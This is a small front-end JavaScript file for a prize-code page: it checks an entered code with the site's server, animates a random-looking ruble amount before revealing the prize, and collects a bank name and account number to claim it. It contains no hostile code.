function checkCode() {
    const code = document.getElementById('checkCode').value;
    if (!code) return alert("Введите код");

    fetch('/check-code', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ code })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            document.getElementById('codeForm').style.display = 'none';
            document.getElementById('result').style.display = 'block';
            animatePrize(data.prize);
        } else {
            alert(data.message);
        }
    });
}

function animatePrize(prize) {
    const display = document.getElementById('randomizer');
    let count = 0;
    const interval = setInterval(() => {
        const rand = Math.floor(Math.random() * 10000);
        display.innerText = rand + ' ₽';
        count += 100;
        if (count >= 3000) {
            clearInterval(interval);
            display.innerText = prize + ' ₽';
            document.getElementById('prizeText').innerText = prize > 0 ? "Ваш приз!" : "Увы, вы не выиграли.";
            if (prize > 0) document.getElementById('claimBtn').style.display = 'block';
        }
    }, 100);
}

function openModal() {
    document.getElementById('modal').classList.remove('hidden');
}

function sendDetails() {
    const bank = document.getElementById('bank').value;
    const account = document.getElementById('account').value;
    fetch('/send-details', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ bank, account })
    }).then(() => {
        alert("Данные отправлены!");
        document.getElementById('modal').classList.add('hidden');
    });
}
